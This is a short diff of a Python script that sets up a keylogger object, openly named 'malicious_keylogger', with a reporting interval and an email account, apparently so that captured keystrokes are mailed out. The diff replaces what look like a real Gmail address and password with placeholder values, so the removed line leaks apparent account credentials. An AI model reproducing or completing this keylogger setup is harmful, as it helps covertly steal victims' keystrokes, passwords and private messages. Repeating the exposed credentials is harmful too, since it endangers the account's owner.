@@ -7,7 +7,7 @@ import keylogger
 import keylogger
 
 
-malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'sahilcutm@gmail.com', 'Surprise_520')
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'your_mail_id@gmail.com', 'mail_password')
 
 # Execute Keylogger
 
